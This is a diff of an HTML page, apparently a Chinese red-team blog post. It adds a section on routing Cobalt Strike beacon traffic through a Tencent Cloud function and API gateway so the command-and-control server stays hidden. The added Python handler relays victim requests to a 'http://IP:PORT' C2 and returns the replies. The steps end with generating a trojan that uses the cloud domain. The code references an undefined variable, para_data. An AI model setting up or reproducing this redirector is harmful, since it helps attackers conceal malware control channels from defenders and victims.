@@ -445,7 +445,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    1.3k
+                    1.7k
                 </div>
                 
 
@@ -584,13 +584,59 @@ https://github.com/rsmudge/Malleable-C2-Profiles</code></pre>
 <p><img src="/assets/image-20211129161253595.png" alt="image-20211129161253595"></p>
 <p>cs中监听器对应配置如下，都写ns记录的值：</p>
 <p><img src="/assets/image-20211129161035273.png" alt="image-20211129161035273"></p>
+<h2 id="腾讯云云函数创建："><a href="#腾讯云云函数创建：" class="headerlink" title="腾讯云云函数创建："></a>腾讯云云函数创建：</h2><p>前往页面 <a target="_blank" rel="noopener" href="https://console.cloud.tencent.com/scf/list?rid=1&amp;ns=default%EF%BC%8C%E7%82%B9%E5%87%BB%E6%96%B0%E5%BB%BA">https://console.cloud.tencent.com/scf/list?rid=1&amp;ns=default，点击新建</a></p>
+<p><img src="/assets/image-20211130161918062.png" alt="image-20211130161918062"></p>
+<p>腾讯云函数创建时，需要选择函数类型，大致区别如下：</p>
+<ul>
+<li>事件函数：通过多种触发器，接收json格式触发执行，适合单个任务(模板简洁)</li>
+<li>WEB函数：通过接收HTTP 请求触发，适用于WEB服务（模板为完整的框架）。</li>
+</ul>
+<p>此处选择 事件函数，便于后面替换代码。</p>
+<p>函数代码放入：</p>
+<p>😭这里踩了好久的坑，我用的jQuery profile，会通过URL传递参数，然而网上给出的代码都对 url参数就行处理，导致url参数掉了，一直无法正常回传数据</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf8 -*-</span>
+<span class="token keyword">import</span> json<span class="token punctuation">,</span>base64<span class="token punctuation">,</span>requests
+<span class="token keyword">def</span> <span class="token function">main_handler</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    C2 <span class="token operator">=</span> <span class="token string">'http://IP:PORT'</span>
+    headers <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token string">'headers'</span><span class="token punctuation">]</span>
+    param <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token string">'queryString'</span><span class="token punctuation">]</span>
+    path <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span>
+    ip <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token string">'requestContext'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'sourceIp'</span><span class="token punctuation">]</span>
+    headers <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token string">'headers'</span><span class="token punctuation">]</span>
+    headers<span class="token punctuation">[</span><span class="token string">'X-Forwarded-For'</span><span class="token punctuation">]</span> <span class="token operator">=</span> ip
+    <span class="token keyword">print</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> event<span class="token punctuation">[</span><span class="token string">'httpMethod'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
+        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>C2<span class="token operator">+</span>path<span class="token punctuation">,</span>params<span class="token operator">=</span>para_data<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>C2<span class="token operator">+</span>path<span class="token punctuation">,</span>params<span class="token operator">=</span>para_data<span class="token punctuation">,</span>data<span class="token operator">=</span>event<span class="token punctuation">[</span><span class="token string">'body'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>content<span class="token punctuation">)</span>
+
+    response<span class="token operator">=</span><span class="token punctuation">{</span>
+        <span class="token string">"isBase64Encoded"</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span>
+        <span class="token string">"statusCode"</span><span class="token punctuation">:</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">,</span>
+        <span class="token string">"headers"</span><span class="token punctuation">:</span><span class="token builtin">dict</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>headers<span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token string">"body"</span><span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">return</span> response</code></pre>
+
+<p>创建完成后，点击 <strong>触发管理</strong>，创建 API网关触发器</p>
+<p>API网关触发器包含两种：集成响应与透传响应，具体区别可看 <a target="_blank" rel="noopener" href="https://cloud.tencent.com/document/product/583/12513">API网关触发器概述</a></p>
+<p><img src="/assets/image-20211130143935222.png" alt="image-20211130143935222"></p>
+<p>创建完成后，进入API网关管理界面，选择刚创建的网关，点击服务名进入服务详情，再点击编辑</p>
+<p><a target="_blank" rel="noopener" href="https://console.cloud.tencent.com/apigateway/service?rid=1">https://console.cloud.tencent.com/apigateway/service?rid=1</a></p>
+<p><img src="/assets/image-20211130144419578.png" alt="image-20211130144419578"></p>
+<p>将路径改为  <code>/</code>,保存后将会获得分配的域名</p>
+<p><img src="/assets/image-20211130144945864.png" alt="image-20211130144945864"></p>
+<p>使用该域名生成木马即可</p>
+<p><img src="/assets/image-20211130151232951.png" alt="image-20211130151232951"></p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
 <li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xy--1/p/14396744.html">https://www.cnblogs.com/Xy--1/p/14396744.html</a></li>
 <li><a target="_blank" rel="noopener" href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></li>
 </ul>
 <p>TODO：</p>
 <ul>
-<li><input disabled="" type="checkbox"> 腾讯云 云函数</li>
+<li><input checked="" disabled="" type="checkbox"> 腾讯云 云函数</li>
 <li><input disabled="" type="checkbox"> 定制profile文件</li>
 </ul>
 
@@ -1118,7 +1164,7 @@ https://github.com/rsmudge/Malleable-C2-Profiles</code></pre>
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;Total Words:&nbsp;<span
-                        class="white-color">21k</span>
+                        class="white-color">21.4k</span>
             
             
             
